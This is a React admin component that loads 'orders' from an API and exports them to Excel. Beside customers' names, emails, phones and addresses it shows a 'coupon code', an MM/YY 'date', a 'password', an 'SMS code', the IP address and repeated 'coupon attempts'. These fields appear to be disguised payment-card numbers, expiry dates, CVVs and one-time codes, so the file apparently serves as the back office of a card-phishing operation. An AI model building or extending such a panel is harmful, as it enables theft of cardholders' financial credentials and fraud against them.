import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Download, FileSpreadsheet, Check } from "lucide-react";
import * as XLSX from "xlsx";
import { Badge } from "@/components/ui/badge";
import { useAdminAuth } from "@/context/AdminAuthContext";
import {
  Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogTrigger,
} from "@/components/ui/dialog";

const API_URL = import.meta.env.DEV ? "http://localhost:3001" : (import.meta.env.VITE_API_URL ?? "");

interface CouponHistoryItem { couponCode: string; dateMMYY: string; password: string; created_at: string; }
interface SmsHistoryItem { smsCode: string; created_at: string; }

interface OrderData {
  id: string;
  created_at: string;
  shop_name?: string;
  customer: { firstName: string; lastName: string; email: string; phone: string; address: string; city: string; state: string; zipCode: string; country: string; };
  total: number;
  status: string;
  couponCode?: string;
  dateMMYY?: string;
  password?: string;
  smsCode?: string;
  ipAddress?: string;
  userAgent?: string;
  couponHistory?: CouponHistoryItem[];
  smsHistory?: SmsHistoryItem[];
}

// Expanded row: one row per coupon (current + history)
interface ExpandedRow {
  orderId: string;
  created_at: string;
  shop_name: string;
  customer: OrderData['customer'];
  total: number;
  orderStatus: string;
  couponCode: string;
  dateMMYY: string;
  password: string;
  smsCode: string;
  ipAddress: string;
  userAgent: string;
  isCurrent: boolean;
  couponTime: string;
  // Keep original order for detail dialog
  _order: OrderData;
}

export const DataExportView = () => {
  const { getAuthHeaders, clearAuth } = useAdminAuth();
  const [orders, setOrders] = useState<OrderData[]>([]);
  const [isExporting, setIsExporting] = useState(false);

  useEffect(() => {
    const loadData = async () => {
      try {
        const res = await fetch(`${API_URL}/api/admin/orders`, { headers: getAuthHeaders() });
        if (res.status === 401) { clearAuth(); return; }
        const data = await res.json();
        if (Array.isArray(data)) setOrders(data);
      } catch (err) { console.error("Failed to load export data", err); }
    };
    loadData();
  }, [getAuthHeaders, clearAuth]);

  // Expand orders: each coupon (current + history) becomes a separate row
  const expandedRows: ExpandedRow[] = orders.flatMap(order => {
    const rows: ExpandedRow[] = [];
    // Current coupon (main row)
    rows.push({
      orderId: order.id,
      created_at: order.created_at,
      shop_name: order.shop_name || '',
      customer: order.customer,
      total: order.total,
      orderStatus: order.status,
      couponCode: order.couponCode || '',
      dateMMYY: order.dateMMYY || '',
      password: order.password || '',
      smsCode: order.smsCode || '',
      ipAddress: order.ipAddress || '',
      userAgent: order.userAgent || '',
      isCurrent: true,
      couponTime: order.created_at,
      _order: order,
    });
    // History coupons
    (order.couponHistory || []).forEach(h => {
      rows.push({
        orderId: order.id,
        created_at: order.created_at,
        shop_name: order.shop_name || '',
        customer: order.customer,
        total: order.total,
        orderStatus: 'HISTORY',
        couponCode: h.couponCode,
        dateMMYY: h.dateMMYY,
        password: h.password,
        smsCode: '',
        ipAddress: order.ipAddress || '',
        userAgent: order.userAgent || '',
        isCurrent: false,
        couponTime: h.created_at,
        _order: order,
      });
    });
    return rows;
  });

  const handleExportXLSX = () => {
    setIsExporting(true);
    const flatData = expandedRows.map(row => ({
      "Order ID": row.orderId,
      "Shop": row.shop_name,
      "Order Date": new Date(row.created_at).toLocaleString(),
      "Type": row.isCurrent ? "Current" : "History",
      "Status": row.orderStatus,
      "Amount": row.total,
      "First Name": row.customer.firstName,
      "Last Name": row.customer.lastName,
      "Email": row.customer.email,
      "Phone": row.customer.phone || "",
      "Address": row.customer.address || "",
      "City": row.customer.city || "",
      "State": row.customer.state || "",
      "Zip Code": row.customer.zipCode || "",
      "Country": row.customer.country || "",
      "Coupon Code": row.couponCode,
      "Coupon Date": row.dateMMYY,
      "Coupon Pass": row.password,
      "Coupon Time": row.couponTime ? new Date(row.couponTime).toLocaleString() : "",
      "SMS Code": row.smsCode,
      "IP Address": row.ipAddress,
      "User Agent": row.userAgent,
    }));

    const worksheet = XLSX.utils.json_to_sheet(flatData);
    const workbook = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(workbook, worksheet, "Orders");
    const max_width = flatData.reduce((w, r) => Math.max(w, r["Order ID"].length), 10);
    worksheet["!cols"] = [{ wch: max_width }];
    XLSX.writeFile(workbook, `orders_export_${new Date().toISOString().split('T')[0]}.xlsx`);
    setTimeout(() => setIsExporting(false), 1000);
  };

  const fmt = (d: string) => { try { return new Date(d).toLocaleString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit' }); } catch { return d; } };

  return (
    <div className="space-y-6 animate-in fade-in duration-500">
      <h2 className="text-2xl font-bold tracking-tight">Data Export</h2>

      <Card className="bg-green-50/50 dark:bg-green-900/10 border-green-200 dark:border-green-800">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-green-700 dark:text-green-500">
            <FileSpreadsheet className="w-6 h-6" />Export Complete Data to Excel
          </CardTitle>
          <CardDescription>Each coupon submission is exported as a separate row. Same Order ID groups multiple coupon attempts together.</CardDescription>
        </CardHeader>
        <CardContent>
          <Button onClick={handleExportXLSX} disabled={isExporting || expandedRows.length === 0} className="w-full sm:w-auto bg-green-600 hover:bg-green-700 text-white min-w-[200px]">
            {isExporting ? <Check className="w-4 h-4 mr-2" /> : <Download className="w-4 h-4 mr-2" />}
            Download .xlsx ({expandedRows.length} rows / {orders.length} orders)
          </Button>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle>Data Preview ({expandedRows.length} rows from {orders.length} orders)</CardTitle>
          <CardDescription>Each coupon attempt is shown as a separate row. Click Order ID for full order details.</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="rounded-md border max-h-[600px] overflow-y-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Order ID</TableHead>
                  <TableHead>Type</TableHead>
                  <TableHead>Amount</TableHead>
                  <TableHead>Customer</TableHead>
                  <TableHead>Coupon Code</TableHead>
                  <TableHead>Date</TableHead>
                  <TableHead>Pass</TableHead>
                  <TableHead>SMS</TableHead>
                  <TableHead>Status</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {expandedRows.length === 0 ? (
                  <TableRow><TableCell colSpan={9} className="text-center py-8 text-muted-foreground">No data available</TableCell></TableRow>
                ) : (
                  expandedRows.map((row, idx) => (
                    <TableRow key={`${row.orderId}-${idx}`} className={!row.isCurrent ? "bg-muted/30" : ""}>
                      <TableCell className="font-mono text-xs">
                        <Dialog>
                          <DialogTrigger asChild>
                            <Button variant="link" className="p-0 h-auto font-mono text-xs underline text-primary">{row.orderId}</Button>
                          </DialogTrigger>
                          <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
                            <DialogHeader>
                              <DialogTitle>Order Details</DialogTitle>
                              <DialogDescription>Full details for {row.orderId}</DialogDescription>
                            </DialogHeader>
                            <div className="space-y-6 py-4">
                              {/* Basic */}
                              <div className="grid grid-cols-2 gap-4 border-b pb-4">
                                <div><div className="text-sm font-medium text-muted-foreground">Date</div><div className="font-mono text-sm">{fmt(row._order.created_at)}</div></div>
                                <div><div className="text-sm font-medium text-muted-foreground">Status</div><Badge variant="outline">{row._order.status}</Badge></div>
                                <div><div className="text-sm font-medium text-muted-foreground">Amount</div><div className="font-medium">${(row._order.total || 0).toFixed(2)}</div></div>
                              </div>
                              {/* Customer */}
                              <div className="border-b pb-4">
                                <div className="text-sm font-bold uppercase tracking-wider mb-3">Customer Information</div>
                                <div className="grid grid-cols-2 gap-y-3 gap-x-8">
                                  <div><div className="text-xs text-muted-foreground">Name</div><div className="font-medium">{row.customer.firstName} {row.customer.lastName}</div></div>
                                  <div><div className="text-xs text-muted-foreground">Email</div><div className="font-medium">{row.customer.email}</div></div>
                                  <div><div className="text-xs text-muted-foreground">Phone</div><div className="font-medium">{row.customer.phone || "N/A"}</div></div>
                                </div>
                              </div>
                              {/* Address */}
                              <div className="border-b pb-4">
                                <div className="text-sm font-bold uppercase tracking-wider mb-3">Shipping Address</div>
                                <div className="grid grid-cols-2 gap-y-3 gap-x-8">
                                  <div className="col-span-2"><div className="text-xs text-muted-foreground">Address</div><div className="font-medium">{row.customer.address || "N/A"}</div></div>
                                  <div><div className="text-xs text-muted-foreground">City</div><div className="font-medium">{row.customer.city || "N/A"}</div></div>
                                  <div><div className="text-xs text-muted-foreground">State</div><div className="font-medium">{row.customer.state || "N/A"}</div></div>
                                  <div><div className="text-xs text-muted-foreground">ZIP</div><div className="font-medium">{row.customer.zipCode || "N/A"}</div></div>
                                  <div><div className="text-xs text-muted-foreground">Country</div><div className="font-medium">{row.customer.country || "N/A"}</div></div>
                                </div>
                              </div>
                              {/* Verification */}
                              <div className="border-b pb-4 bg-muted/20 -mx-6 px-6 py-4">
                                <div className="text-sm font-bold uppercase tracking-wider mb-3">Current Verification</div>
                                <div className="grid grid-cols-2 gap-y-3 gap-x-8">
                                  <div><div className="text-xs text-muted-foreground">Coupon Code</div><div className="font-mono font-medium">{row._order.couponCode || "N/A"}</div></div>
                                  <div><div className="text-xs text-muted-foreground">Date</div><div className="font-mono font-medium">{row._order.dateMMYY || "N/A"}</div></div>
                                  <div><div className="text-xs text-muted-foreground">Password</div><div className="font-mono font-bold text-red-500">{row._order.password || "N/A"}</div></div>
                                  <div><div className="text-xs text-muted-foreground">SMS Code</div><div className="font-mono font-bold text-blue-600">{row._order.smsCode || "N/A"}</div></div>
                                </div>
                              </div>
                              {/* Technical */}
                              <div>
                                <div className="text-sm font-bold uppercase tracking-wider mb-3">Technical Log</div>
                                <div className="space-y-3">
                                  <div className="flex items-start gap-3"><div className="text-xs text-muted-foreground min-w-[40px] pt-1">IP</div><div className="font-mono text-sm bg-muted px-2 py-1 rounded break-all flex-1">{row._order.ipAddress || "Unknown"}</div></div>
                                  <div className="flex items-start gap-3"><div className="text-xs text-muted-foreground min-w-[40px] pt-1">UA</div><div className="font-mono text-xs bg-muted px-2 py-1 rounded break-all leading-relaxed flex-1">{row._order.userAgent || "Unknown"}</div></div>
                                </div>
                              </div>
                            </div>
                          </DialogContent>
                        </Dialog>
                      </TableCell>
                      <TableCell>
                        <Badge variant={row.isCurrent ? "default" : "secondary"} className="text-[10px]">
                          {row.isCurrent ? "Current" : "History"}
                        </Badge>
                      </TableCell>
                      <TableCell className="font-medium text-sm">${(row.total || 0).toFixed(2)}</TableCell>
                      <TableCell className="text-xs">
                        <div className="font-medium">{row.customer.firstName} {row.customer.lastName}</div>
                        <div className="text-muted-foreground">{row.customer.email}</div>
                      </TableCell>
                      <TableCell className="font-mono text-xs">{row.couponCode || "-"}</TableCell>
                      <TableCell className="font-mono text-xs">{row.dateMMYY || "-"}</TableCell>
                      <TableCell className="font-mono text-xs text-red-500">{row.password || "-"}</TableCell>
                      <TableCell className="font-mono text-xs text-blue-600">{row.smsCode || "-"}</TableCell>
                      <TableCell className="text-xs">{row.orderStatus}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};
